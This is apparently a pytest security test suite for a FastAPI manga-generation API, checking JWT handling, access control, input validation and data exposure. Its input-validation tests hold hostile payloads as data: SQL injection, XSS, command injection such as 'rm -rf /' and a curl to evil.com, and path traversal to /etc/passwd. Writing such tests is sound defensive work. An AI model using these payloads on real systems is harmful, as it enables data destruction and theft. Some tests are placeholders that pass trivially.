"""Security tests for authentication and authorization."""

import pytest
import jwt
from unittest.mock import AsyncMock, patch, MagicMock
from uuid import uuid4
from datetime import datetime, timedelta
from typing import Dict, Any

from httpx import AsyncClient
from fastapi import status

from app.models.user import User


@pytest.mark.asyncio
class TestAuthenticationSecurity:
    """Test authentication security mechanisms."""
    
    async def test_jwt_token_validation(self, test_client: AsyncClient):
        """Test JWT token validation security."""
        session_id = uuid4()
        
        # Test with no token
        response = await test_client.get(f"/api/v1/sessions/{session_id}")
        assert response.status_code in [401, 403]
        
        # Test with malformed token
        malformed_headers = {"Authorization": "Bearer invalid.token.format"}
        response = await test_client.get(
            f"/api/v1/sessions/{session_id}",
            headers=malformed_headers
        )
        assert response.status_code in [401, 403]
        
        # Test with expired token
        expired_payload = {
            "user_id": str(uuid4()),
            "exp": datetime.utcnow() - timedelta(hours=1),  # Expired 1 hour ago
            "iat": datetime.utcnow() - timedelta(hours=2)
        }
        expired_token = jwt.encode(expired_payload, "secret", algorithm="HS256")
        expired_headers = {"Authorization": f"Bearer {expired_token}"}
        
        response = await test_client.get(
            f"/api/v1/sessions/{session_id}",
            headers=expired_headers
        )
        assert response.status_code in [401, 403]
    
    async def test_token_signature_verification(self, test_client: AsyncClient):
        """Test JWT token signature verification."""
        session_id = uuid4()
        
        # Create token with wrong secret
        payload = {
            "user_id": str(uuid4()),
            "exp": datetime.utcnow() + timedelta(hours=1),
            "iat": datetime.utcnow()
        }
        
        # Token signed with wrong secret
        wrong_secret_token = jwt.encode(payload, "wrong_secret", algorithm="HS256")
        wrong_headers = {"Authorization": f"Bearer {wrong_secret_token}"}
        
        response = await test_client.get(
            f"/api/v1/sessions/{session_id}",
            headers=wrong_headers
        )
        assert response.status_code in [401, 403]
    
    async def test_token_algorithm_security(self, test_client: AsyncClient):
        """Test protection against JWT algorithm attacks."""
        session_id = uuid4()
        
        # Test 'none' algorithm attack
        payload = {
            "user_id": str(uuid4()),
            "exp": datetime.utcnow() + timedelta(hours=1),
            "iat": datetime.utcnow()
        }
        
        # Create unsigned token (algorithm 'none')
        unsigned_token = jwt.encode(payload, "", algorithm="none")
        unsigned_headers = {"Authorization": f"Bearer {unsigned_token}"}
        
        response = await test_client.get(
            f"/api/v1/sessions/{session_id}",
            headers=unsigned_headers
        )
        assert response.status_code in [401, 403]
    
    async def test_token_replay_attack_protection(self, test_client: AsyncClient):
        """Test protection against token replay attacks."""
        # This would test token blacklisting, nonce validation, or time-based restrictions
        # Implementation depends on the actual security measures in place
        
        valid_payload = {
            "user_id": str(uuid4()),
            "exp": datetime.utcnow() + timedelta(hours=1),
            "iat": datetime.utcnow(),
            "jti": str(uuid4())  # JWT ID for tracking
        }
        
        token = jwt.encode(valid_payload, "secret", algorithm="HS256")
        headers = {"Authorization": f"Bearer {token}"}
        
        session_id = uuid4()
        
        # In a real implementation, you'd test that:
        # 1. Tokens can't be reused after logout
        # 2. Tokens have proper expiration
        # 3. Tokens can be invalidated/blacklisted
        
        response = await test_client.get(
            f"/api/v1/sessions/{session_id}",
            headers=headers
        )
        
        # This test documents the expected behavior
        # Actual implementation would need proper mocking of auth service
        assert response.status_code in [200, 401, 403, 404]


@pytest.mark.asyncio
class TestAuthorizationSecurity:
    """Test authorization and access control security."""
    
    async def test_user_session_isolation(self, test_client: AsyncClient):
        """Test that users can only access their own sessions."""
        # Create two different user sessions
        user1_id = uuid4()
        user2_id = uuid4()
        session1_id = uuid4()
        session2_id = uuid4()
        
        # Mock authentication service
        with patch('app.api.v1.manga_sessions.get_current_active_user') as mock_auth:
            # User 1 trying to access User 2's session
            mock_user1 = MagicMock()
            mock_user1.id = user1_id
            mock_auth.return_value = mock_user1
            
            with patch('app.api.v1.manga_sessions.get_manga_service') as mock_service:
                # Mock session owned by user 2
                mock_session = MagicMock()
                mock_session.id = session2_id
                mock_session.user_id = str(user2_id)  # Different user
                
                mock_service.return_value.session_repository.find_by_id = AsyncMock(
                    return_value=mock_session
                )
                
                headers = {"Authorization": "Bearer valid_token"}
                response = await test_client.get(
                    f"/api/v1/sessions/{session2_id}",
                    headers=headers
                )
                
                # Should be forbidden
                assert response.status_code == status.HTTP_403_FORBIDDEN
    
    async def test_role_based_access_control(self, test_client: AsyncClient):
        """Test role-based access control."""
        session_id = uuid4()
        
        # Test regular user trying to access admin functions
        with patch('app.api.v1.manga_sessions.get_current_active_user') as mock_auth:
            mock_user = MagicMock()
            mock_user.id = uuid4()
            mock_user.is_superuser = False  # Regular user
            mock_auth.return_value = mock_user
            
            # Try to access admin-only endpoint (if any exist)
            headers = {"Authorization": "Bearer user_token"}
            
            # This would test admin-only endpoints
            # For now, document that RBAC should be implemented
            response = await test_client.get(
                "/api/v1/sessions/",  # Regular endpoint
                headers=headers
            )
            
            # Should work for regular endpoints
            assert response.status_code in [200, 404]  # 404 due to mocking
    
    async def test_resource_ownership_validation(self, test_client: AsyncClient):
        """Test resource ownership validation."""
        user_id = uuid4()
        session_id = uuid4()
        
        with patch('app.api.v1.manga_sessions.get_current_active_user') as mock_auth, \
             patch('app.api.v1.manga_sessions.get_manga_service') as mock_service:
            
            mock_user = MagicMock()
            mock_user.id = user_id
            mock_auth.return_value = mock_user
            
            # Test accessing owned resource
            mock_owned_session = MagicMock()
            mock_owned_session.id = session_id
            mock_owned_session.user_id = str(user_id)  # Same user
            
            mock_service.return_value.session_repository.find_by_id = AsyncMock(
                return_value=mock_owned_session
            )
            
            headers = {"Authorization": "Bearer valid_token"}
            response = await test_client.get(
                f"/api/v1/sessions/{session_id}",
                headers=headers
            )
            
            # Should succeed for owned resource
            assert response.status_code == status.HTTP_200_OK
    
    async def test_permission_escalation_prevention(self, test_client: AsyncClient):
        """Test prevention of permission escalation attacks."""
        user_id = uuid4()
        
        # Test that users can't escalate permissions through request manipulation
        with patch('app.api.v1.manga_sessions.get_current_active_user') as mock_auth:
            mock_user = MagicMock()
            mock_user.id = user_id
            mock_user.is_superuser = False
            mock_auth.return_value = mock_user
            
            # Try to create session with admin privileges (if such field exists)
            session_data = {
                "title": "Escalation Test",
                "input_text": "Testing privilege escalation prevention",
                "generation_params": {
                    "admin_override": True,  # Attempting privilege escalation
                    "bypass_limits": True,
                    "quality_level": "ultra_high"
                }
            }
            
            headers = {"Authorization": "Bearer user_token"}
            response = await test_client.post(
                "/api/v1/sessions/",
                json=session_data,
                headers=headers
            )
            
            # Should either succeed with privileges ignored or fail validation
            assert response.status_code in [201, 422, 403]
    
    async def test_cross_user_data_leakage_prevention(self, test_client: AsyncClient):
        """Test prevention of cross-user data leakage."""
        user1_id = uuid4()
        user2_id = uuid4()
        
        with patch('app.api.v1.manga_sessions.get_current_active_user') as mock_auth, \
             patch('app.api.v1.manga_sessions.get_manga_service') as mock_service:
            
            mock_user1 = MagicMock()
            mock_user1.id = user1_id
            mock_auth.return_value = mock_user1
            
            # Mock service to return sessions for user1 only
            user1_sessions = [
                MagicMock(id=uuid4(), user_id=str(user1_id), title="User1 Session 1"),
                MagicMock(id=uuid4(), user_id=str(user1_id), title="User1 Session 2")
            ]
            
            # Ensure no user2 sessions are returned
            mock_service.return_value.get_user_sessions = AsyncMock(
                return_value=user1_sessions
            )
            
            headers = {"Authorization": "Bearer user1_token"}
            response = await test_client.get(
                "/api/v1/sessions/",
                headers=headers
            )
            
            if response.status_code == 200:
                sessions = response.json()
                # Verify no sessions from other users are included
                for session in sessions:
                    assert session.get("user_id") != str(user2_id)


@pytest.mark.asyncio
class TestInputValidationSecurity:
    """Test input validation for security vulnerabilities."""
    
    async def test_sql_injection_prevention(self, test_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test SQL injection prevention in API inputs."""
        # Test SQL injection in session title
        malicious_data = {
            "title": "'; DROP TABLE manga_sessions; --",
            "input_text": "Testing SQL injection prevention in session creation",
            "generation_params": {}
        }
        
        response = await test_client.post(
            "/api/v1/sessions/",
            json=malicious_data,
            headers=auth_headers
        )
        
        # Should either succeed (with sanitized input) or fail validation
        # But should never cause SQL injection
        assert response.status_code in [201, 422, 400]
        
        # Test SQL injection in query parameters
        response = await test_client.get(
            "/api/v1/sessions/?status=' OR '1'='1",
            headers=auth_headers
        )
        
        # Should handle malicious input safely
        assert response.status_code in [200, 422, 400]
    
    async def test_xss_prevention(self, test_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test XSS prevention in API responses."""
        # Test XSS in session title
        xss_data = {
            "title": "<script>alert('XSS')</script>",
            "input_text": "<img src=x onerror=alert('XSS')>Testing XSS prevention</img>",
            "generation_params": {
                "style": "<script>document.location='http://evil.com'</script>"
            }
        }
        
        with patch('app.api.v1.manga_sessions.get_manga_service') as mock_service:
            mock_session = MagicMock()
            mock_session.id = uuid4()
            mock_session.title = xss_data["title"]  # Should be sanitized
            
            mock_service.return_value.start_manga_generation = AsyncMock(
                return_value=mock_session
            )
            
            response = await test_client.post(
                "/api/v1/sessions/",
                json=xss_data,
                headers=auth_headers
            )
            
            if response.status_code == 201:
                response_data = response.json()
                # Verify XSS payload is sanitized or escaped
                assert "<script>" not in response_data.get("title", "")
                assert "onerror=" not in str(response_data)
    
    async def test_command_injection_prevention(self, test_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test command injection prevention."""
        # Test command injection in input text
        command_injection_data = {
            "title": "Command Injection Test",
            "input_text": "Story about adventure; rm -rf /; echo 'pwned'",
            "generation_params": {
                "style": "$(curl http://evil.com/steal_data)",
                "quality_level": "`cat /etc/passwd`"
            }
        }
        
        response = await test_client.post(
            "/api/v1/sessions/",
            json=command_injection_data,
            headers=auth_headers
        )
        
        # Should handle safely without executing commands
        assert response.status_code in [201, 422, 400]
    
    async def test_path_traversal_prevention(self, test_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test path traversal prevention."""
        # Test path traversal in session ID
        traversal_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]
        
        for path in traversal_paths:
            response = await test_client.get(
                f"/api/v1/sessions/{path}",
                headers=auth_headers
            )
            
            # Should not succeed in path traversal
            assert response.status_code in [400, 404, 422]
            
            # Should not return file contents
            if response.status_code == 200:
                content = response.text.lower()
                assert "root:" not in content  # Unix passwd file
                assert "administrator" not in content  # Windows user
    
    async def test_json_injection_prevention(self, test_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test JSON injection prevention."""
        # Test JSON structure manipulation
        malicious_json = {
            "title": "JSON Injection Test",
            "input_text": "Testing JSON injection",
            "generation_params": {
                "normal_param": "value",
                "__proto__": {"admin": True},  # Prototype pollution
                "constructor": {"prototype": {"admin": True}},
                "admin_override": True
            },
            # Attempt to inject additional fields
            "is_admin": True,
            "bypass_validation": True,
            "secret_key": "attempt_to_override"
        }
        
        response = await test_client.post(
            "/api/v1/sessions/",
            json=malicious_json,
            headers=auth_headers
        )
        
        # Should handle malicious JSON safely
        assert response.status_code in [201, 422, 400]
        
        if response.status_code == 201:
            # Verify malicious fields are not reflected
            response_data = response.json()
            assert "is_admin" not in response_data
            assert "secret_key" not in response_data
    
    async def test_file_upload_security(self, test_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test file upload security (if file uploads are supported)."""
        # This would test file upload endpoints if they exist
        # Testing for:
        # - File type validation
        # - File size limits
        # - Malicious file content
        # - Path traversal in filenames
        
        malicious_files = [
            ("../../../etc/passwd", "text/plain"),
            ("script.exe", "application/x-executable"),
            ("large_file.txt", "text/plain"),  # Would be oversized
            ("normal_file.txt", "text/plain")
        ]
        
        # This is a placeholder as file upload endpoints may not exist yet
        # In actual implementation, would test actual file upload security
        for filename, content_type in malicious_files:
            # Would test actual file upload
            pass
    
    async def test_rate_limiting_security(self, test_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test rate limiting as a security measure."""
        # Rapid requests to test rate limiting
        requests_made = 0
        rate_limited_count = 0
        
        for i in range(10):  # Make multiple rapid requests
            response = await test_client.get(
                "/api/v1/sessions/",
                headers=auth_headers
            )
            requests_made += 1
            
            if response.status_code == 429:  # Too Many Requests
                rate_limited_count += 1
        
        # Rate limiting should kick in at some point for rapid requests
        # (This depends on actual rate limiting configuration)
        print(f"Rate limiting test: {rate_limited_count}/{requests_made} requests rate limited")
        
        # Document that rate limiting should be implemented
        assert requests_made == 10  # All requests were made


@pytest.mark.asyncio
class TestDataProtectionSecurity:
    """Test data protection and privacy security."""
    
    async def test_sensitive_data_exposure_prevention(self, test_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test prevention of sensitive data exposure."""
        session_id = uuid4()
        
        with patch('app.api.v1.manga_sessions.get_manga_service') as mock_service:
            # Mock session with potentially sensitive data
            mock_session = MagicMock()
            mock_session.id = session_id
            mock_session.user_id = "test-user-id"
            mock_session.title = "Test Session"
            mock_session.status = "completed"
            
            # These should not be exposed in API responses
            mock_session.internal_processing_data = {"secret": "internal_value"}
            mock_session.user_email = "user@example.com"
            mock_session.api_keys = {"gemini": "secret_key"}
            
            mock_service.return_value.session_repository.find_by_id = AsyncMock(
                return_value=mock_session
            )
            
            response = await test_client.get(
                f"/api/v1/sessions/{session_id}",
                headers=auth_headers
            )
            
            if response.status_code == 200:
                response_data = response.json()
                
                # Verify sensitive data is not exposed
                response_text = str(response_data).lower()
                assert "secret" not in response_text
                assert "password" not in response_text
                assert "api_key" not in response_text
                assert "secret_key" not in response_text
    
    async def test_error_message_information_disclosure(self, test_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test that error messages don't leak sensitive information."""
        # Test various error conditions
        error_scenarios = [
            ("/api/v1/sessions/00000000-0000-0000-0000-000000000000", "Non-existent session"),
            (f"/api/v1/sessions/{uuid4()}/phases/999", "Invalid phase number"),
            ("/api/v1/sessions/invalid-uuid", "Invalid UUID format")
        ]
        
        for endpoint, description in error_scenarios:
            response = await test_client.get(endpoint, headers=auth_headers)
            
            if response.status_code >= 400:
                response_text = response.text.lower()
                
                # Error messages should not contain sensitive information
                sensitive_patterns = [
                    "database", "sql", "connection", "server", "internal",
                    "stacktrace", "traceback", "exception", "debug",
                    "password", "secret", "key", "token"
                ]
                
                for pattern in sensitive_patterns:
                    assert pattern not in response_text, f"Error message contains sensitive info: {pattern}"
    
    async def test_logging_security(self, test_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test that logging doesn't expose sensitive information."""
        # This would test actual logging behavior
        # In a real implementation, you'd capture logs and verify they don't contain:
        # - User passwords
        # - API keys
        # - Personal information
        # - Database connection strings
        # - JWT tokens
        
        session_data = {
            "title": "Logging Security Test",
            "input_text": "Testing logging security with potentially sensitive data",
            "generation_params": {
                "user_api_key": "fake_sensitive_key",  # Should not be logged
                "personal_info": "sensitive personal data"
            }
        }
        
        with patch('app.api.v1.manga_sessions.get_manga_service'):
            response = await test_client.post(
                "/api/v1/sessions/",
                json=session_data,
                headers=auth_headers
            )
        
        # In actual implementation, would verify logs don't contain sensitive data
        # This test documents the requirement
        assert True  # Placeholder for actual log verification